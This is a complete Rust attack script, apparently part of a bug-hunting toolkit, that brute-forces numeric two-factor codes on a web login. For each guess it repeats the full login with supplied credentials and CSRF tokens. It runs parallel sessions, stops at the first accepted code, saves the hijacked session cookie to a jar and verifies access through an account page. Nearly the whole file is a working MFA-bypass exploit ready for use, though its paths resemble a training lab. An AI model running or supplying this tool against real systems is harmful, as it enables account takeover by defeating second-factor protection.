#!/usr/bin/env rust-script
//! name: mfa_relogin_brute
//! description: 重登录型 2FA 码枚举件 - 每个候选码走完整会话链(GET /login 取 csrf → POST /login 首因子 → GET /login2 取 csrf → POST /login2 投码),因为服务端对错误码弃会话、每次猜码都必须重新登录;N 线程各持独立会话并行扫码,首命中即停,胜出会话复验 --confirm-path 并写回 jar;一个信封给出中码、逐步状态直方图、确认页片段、速率与失败分类
//! version: 1.0.0
//! args: <base-url> --user U --password P [--start 0] [--end 9999] [--len 4] [--threads 8] [--jar PATH] [--confirm-path /my-account] [--login-path /login] [--mfa-path /login2] [--field mfa-code] [--timeout-ms N] [--snippet N] [--selftest]
//! keywords: 漏洞猎手套件, 2fa, mfa, brute, otp, relogin, authentication, 安全码
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use url::Url;

struct Cfg {
    base: String,
    user: String,
    password: String,
    start: usize,
    end: usize,
    len: usize,
    threads: usize,
    jar: Option<String>,
    confirm_path: String,
    login_path: String,
    mfa_path: String,
    field: String,
    timeout_ms: u64,
    snippet: usize,
}

struct Reply {
    status: u16,
    location: String,
    set_cookie: Vec<String>,
    body: String,
    transport: Option<String>,
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut cfg = Cfg {
        base: String::new(),
        user: String::new(),
        password: String::new(),
        start: 0,
        end: 9999,
        len: 4,
        threads: 8,
        jar: None,
        confirm_path: "/my-account".to_string(),
        login_path: "/login".to_string(),
        mfa_path: "/login2".to_string(),
        field: "mfa-code".to_string(),
        timeout_ms: 20000,
        snippet: 240,
    };
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--user" => { i += 1; cfg.user = a(&args, i); }
            "--password" => { i += 1; cfg.password = a(&args, i); }
            "--start" => { i += 1; cfg.start = a(&args, i).parse().unwrap_or(0); }
            "--end" => { i += 1; cfg.end = a(&args, i).parse().unwrap_or(9999); }
            "--len" => { i += 1; cfg.len = a(&args, i).parse().unwrap_or(4); }
            "--threads" => { i += 1; cfg.threads = a(&args, i).parse().unwrap_or(8).max(1); }
            "--jar" => { i += 1; cfg.jar = Some(a(&args, i)); }
            "--confirm-path" => { i += 1; cfg.confirm_path = a(&args, i); }
            "--login-path" => { i += 1; cfg.login_path = a(&args, i); }
            "--mfa-path" => { i += 1; cfg.mfa_path = a(&args, i); }
            "--field" => { i += 1; cfg.field = a(&args, i); }
            "--timeout-ms" => { i += 1; cfg.timeout_ms = a(&args, i).parse().unwrap_or(20000); }
            "--snippet" => { i += 1; cfg.snippet = a(&args, i).parse().unwrap_or(240); }
            other if !other.starts_with("--") && cfg.base.is_empty() => cfg.base = other.trim_end_matches('/').to_string(),
            _ => {}
        }
        i += 1;
    }
    if cfg.base.is_empty() || cfg.user.is_empty() || cfg.password.is_empty() {
        pi_rust_lib::report::failure(
            "mfa_relogin_brute",
            "missing base-url/--user/--password",
            "usage: mfa_relogin_brute <base-url> --user U --password P [--end 9999] [--threads 8] [--jar PATH]",
        );
        std::process::exit(2);
    }
    if cfg.end < cfg.start {
        pi_rust_lib::report::failure("mfa_relogin_brute", "empty range: --end < --start", "swap the bounds and rerun");
        std::process::exit(2);
    }

    let login_url = Arc::new(format!("{}{}", cfg.base, cfg.login_path));
    let mfa_url = Arc::new(format!("{}{}", cfg.base, cfg.mfa_path));
    let user = Arc::new(cfg.user.clone());
    let password = Arc::new(cfg.password.clone());
    let field = Arc::new(cfg.field.clone());
    let hit_flag = Arc::new(AtomicBool::new(false));
    let next = Arc::new(AtomicUsize::new(cfg.start));
    let attempts = Arc::new(AtomicUsize::new(0));
    let requests = Arc::new(AtomicUsize::new(0));
    let hist: Arc<Mutex<BTreeMap<String, usize>>> = Arc::new(Mutex::new(BTreeMap::new()));
    let found: Arc<Mutex<Option<Value>>> = Arc::new(Mutex::new(None));
    let len = cfg.len;
    let end = cfg.end;
    let snippet = cfg.snippet;
    let timeout_ms = cfg.timeout_ms;

    let started = Instant::now();
    let mut handles = Vec::new();
    for _ in 0..cfg.threads {
        let agent = ureq::AgentBuilder::new()
            .timeout(Duration::from_millis(timeout_ms))
            .redirects(0)
            .build();
        let hit_flag = hit_flag.clone();
        let next = next.clone();
        let attempts = attempts.clone();
        let requests = requests.clone();
        let hist = hist.clone();
        let found = found.clone();
        let login_url = login_url.clone();
        let mfa_url = mfa_url.clone();
        let user = user.clone();
        let password = password.clone();
        let field = field.clone();
        handles.push(std::thread::spawn(move || loop {
            if hit_flag.load(Ordering::SeqCst) {
                break;
            }
            let n = next.fetch_add(1, Ordering::SeqCst);
            if n > end {
                break;
            }
            let code = pad(n, len);
            attempts.fetch_add(1, Ordering::SeqCst);
            let outcome = attempt(&agent, &login_url, &mfa_url, &user, &password, &field, &code, snippet, &requests, &hist);
            if let Some(record) = outcome {
                hit_flag.store(true, Ordering::SeqCst);
                if let Ok(mut slot) = found.lock() {
                    if slot.is_none() {
                        *slot = Some(record);
                    }
                }
                break;
            }
        }));
    }
    for h in handles {
        let _ = h.join();
    }
    let elapsed_ms = started.elapsed().as_millis() as u64;

    let hit = found.lock().ok().and_then(|s| s.clone());
    let histogram: Vec<Value> = hist
        .lock()
        .map(|h| h.iter().map(|(k, c)| json!({"step": k, "count": c})).collect())
        .unwrap_or_default();

    let mut confirm = Value::Null;
    let mut jar_updated = false;
    if let Some(h) = &hit {
        let cookie = h.get("session_cookie").and_then(|v| v.as_str()).unwrap_or("").to_string();
        if !cookie.is_empty() {
            let target = format!("{}{}", cfg.base, cfg.confirm_path);
            let agent = ureq::AgentBuilder::new()
                .timeout(Duration::from_millis(cfg.timeout_ms))
                .redirects(2)
                .build();
            let reply = do_get(&agent, &target, &cookie);
            confirm = json!({
                "url": target,
                "status": reply.status,
                "set_cookie": reply.set_cookie.iter().map(|c| c.split('=').next().unwrap_or("").to_string()).collect::<Vec<_>>(),
                "snippet": collapse(&reply.body, cfg.snippet),
            });
            if let (Some(jar_path), Ok(mut u)) = (cfg.jar.as_deref(), Url::parse(&cfg.base)) {
                let host = u.host_str().unwrap_or("").to_string();
                u.set_path("");
                let mut jar: BTreeMap<String, BTreeMap<String, String>> = std::fs::read_to_string(jar_path)
                    .ok()
                    .and_then(|s| pi_rust_lib::serde_json::from_str(&s).ok())
                    .unwrap_or_default();
                let entry = jar.entry(host).or_default();
                for pair in cookie.split("; ") {
                    if let Some((k, v)) = pair.split_once('=') {
                        entry.insert(k.trim().to_string(), v.trim().to_string());
                    }
                }
                if pi_rust_lib::serde_json::to_string(&jar).ok().map(|t| std::fs::write(jar_path, t).is_ok()).unwrap_or(false) {
                    jar_updated = true;
                }
            }
        }
    }

    let reqs = requests.load(Ordering::SeqCst) as u64;
    let att = attempts.load(Ordering::SeqCst) as u64;
    let data = json!({
        "base": cfg.base,
        "range": format!("{}-{}", cfg.start, cfg.end),
        "code_len": cfg.len,
        "threads": cfg.threads,
        "attempts": att,
        "requests": reqs,
        "elapsed_ms": elapsed_ms,
        "reqs_per_sec": if elapsed_ms > 0 { json!((reqs * 1000 / elapsed_ms)) } else { json!(0) },
        "status_histogram": histogram,
        "hit": hit,
        "confirm": confirm,
        "jar_updated": jar_updated,
    });
    let cta = if data["hit"].is_null() {
        "no code in range; re-run the same range (the code rotates on a TTL) or widen --end/--len, and check the step histogram for login-side throttling"
    } else {
        "confirm snippet proves the account; keep the jar session"
    };
    pi_rust_lib::report::success("mfa_relogin_brute", data, cta).expect("report success");
}

fn a(args: &[String], i: usize) -> String {
    args.get(i).cloned().unwrap_or_default()
}

fn pad(n: usize, len: usize) -> String {
    let s = n.to_string();
    if s.len() >= len {
        s
    } else {
        format!("{}{}", "0".repeat(len - s.len()), s)
    }
}

fn find_csrf(html: &str) -> Option<String> {
    let idx = html.find("name=\"csrf\"")?;
    let rest = &html[idx..];
    let v = rest.find("value=\"")?;
    let rest = &rest[v + 7..];
    let end = rest.find('"')?;
    Some(rest[..end].to_string())
}

fn apply_cookies(jar: &mut BTreeMap<String, String>, sets: &[String]) {
    for raw in sets {
        let first = raw.split(';').next().unwrap_or("").trim();
        if let Some((k, v)) = first.split_once('=') {
            jar.insert(k.trim().to_string(), v.trim().to_string());
        }
    }
}

fn cookie_header(jar: &BTreeMap<String, String>) -> String {
    jar.iter().map(|(k, v)| format!("{k}={v}")).collect::<Vec<_>>().join("; ")
}

/// One guess: a whole session chain. Returns Some(record) only on a real code hit.
fn attempt(
    agent: &ureq::Agent,
    login_url: &str,
    mfa_url: &str,
    user: &str,
    password: &str,
    field: &str,
    code: &str,
    snippet: usize,
    requests: &AtomicUsize,
    hist: &Mutex<BTreeMap<String, usize>>,
) -> Option<Value> {
    let mut jar: BTreeMap<String, String> = BTreeMap::new();
    let mut steps: Vec<Value> = Vec::new();

    let note = |tag: &str, status: u16, requests: &AtomicUsize, hist: &Mutex<BTreeMap<String, usize>>| {
        requests.fetch_add(1, Ordering::SeqCst);
        if let Ok(mut h) = hist.lock() {
            *h.entry(format!("{tag}/{status}")).or_insert(0) += 1;
        }
    };

    // 1. login page -> first csrf
    let r1 = do_get(agent, login_url, &cookie_header(&jar));
    note("login_get", r1.status, requests, hist);
    apply_cookies(&mut jar, &r1.set_cookie);
    let csrf1 = match find_csrf(&r1.body) {
        Some(c) => c,
        None => return None,
    };

    // 2. first factor -> /login2 session
    let body1 = format!("csrf={}&username={}&password={}", csrf1, user, password);
    let r2 = do_post(agent, login_url, &cookie_header(&jar), &body1);
    note("login_post", r2.status, requests, hist);
    apply_cookies(&mut jar, &r2.set_cookie);
    if r2.status != 302 {
        return None;
    }

    // 3. 2FA page -> second csrf
    let r3 = do_get(agent, mfa_url, &cookie_header(&jar));
    note("mfa_get", r3.status, requests, hist);
    apply_cookies(&mut jar, &r3.set_cookie);
    let csrf2 = match find_csrf(&r3.body) {
        Some(c) => c,
        None => return None,
    };

    // 4. the guess itself
    let body2 = format!("csrf={}&{}={}", csrf2, field, code);
    let r4 = do_post(agent, mfa_url, &cookie_header(&jar), &body2);
    note("mfa_post", r4.status, requests, hist);
    apply_cookies(&mut jar, &r4.set_cookie);

    if r4.transport.is_some() {
        return None;
    }
    steps.push(json!({"login_get": r1.status, "login_post": r2.status, "mfa_get": r3.status, "mfa_post": r4.status}));

    let accepted = (300..400).contains(&r4.status);
    let incorrect = r4.status == 200 && r4.body.contains("Incorrect");
    if accepted {
        // prefer the fresh session cookie minted by the success redirect
        let mut winner = jar.clone();
        apply_cookies(&mut winner, &r4.set_cookie);
        return Some(json!({
            "code": code,
            "status": r4.status,
            "location": r4.location,
            "session_cookie": cookie_header(&winner),
            "set_cookie": r4.set_cookie.iter().map(|c| c.split('=').next().unwrap_or("").to_string()).collect::<Vec<_>>(),
            "snapshot": collapse(&r4.body, snippet),
            "steps": steps,
        }));
    }
    if !incorrect && r4.status != 200 {
        // 400 = csrf/session lost, 429/500 = throttling; visible in the histogram
        return None;
    }
    None
}

fn do_get(agent: &ureq::Agent, url: &str, cookies: &str) -> Reply {
    let mut req = agent.get(url);
    if !cookies.is_empty() {
        req = req.set("Cookie", cookies);
    }
    finish(req.call())
}

fn do_post(agent: &ureq::Agent, url: &str, cookies: &str, body: &str) -> Reply {
    let mut req = agent.post(url).set("Content-Type", "application/x-www-form-urlencoded");
    if !cookies.is_empty() {
        req = req.set("Cookie", cookies);
    }
    finish(req.send_string(body))
}

fn finish(r: Result<ureq::Response, ureq::Error>) -> Reply {
    match r {
        Ok(resp) => read(resp),
        Err(ureq::Error::Status(_, resp)) => read(resp),
        Err(e) => Reply {
            status: 0,
            location: String::new(),
            set_cookie: Vec::new(),
            body: String::new(),
            transport: Some(e.to_string()),
        },
    }
}

fn read(resp: ureq::Response) -> Reply {
    let status = resp.status();
    let location = resp.header("Location").unwrap_or("").to_string();
    let set_cookie: Vec<String> = resp.all("Set-Cookie").iter().map(|s| s.to_string()).collect();
    let body = resp.into_string().unwrap_or_default();
    Reply { status, location, set_cookie, body, transport: None }
}

fn collapse(text: &str, limit: usize) -> String {
    let one: String = text.split_whitespace().collect::<Vec<_>>().join(" ");
    if one.len() > limit {
        format!("{}...", &one[..limit.min(one.len())])
    } else {
        one
    }
}

fn selftest() {
    let page = r#"<form><input required type="hidden" name="csrf" value="AbC123"></form>"#;
    let csrf_ok = find_csrf(page).as_deref() == Some("AbC123");
    let pad_ok = pad(7, 4) == "0007" && pad(9999, 4) == "9999";
    let mut jar: BTreeMap<String, String> = BTreeMap::new();
    apply_cookies(&mut jar, &["session=zz; Secure; HttpOnly".to_string(), "x=1; Path=/".to_string()]);
    let jar_ok = cookie_header(&jar) == "session=zz; x=1";
    let receipt = csrf_ok && pad_ok && jar_ok;
    let data = json!({"selftest": if receipt {"ok"} else {"fail"}, "csrf": csrf_ok, "pad": pad_ok, "cookie": jar_ok});
    if receipt {
        pi_rust_lib::report::success("mfa_relogin_brute", data, "selftest passed; run against the target").expect("report");
    } else {
        pi_rust_lib::report::failure("mfa_relogin_brute", "selftest failed", "inspect csrf/pad/cookie assertions");
        std::process::exit(1);
    }
}
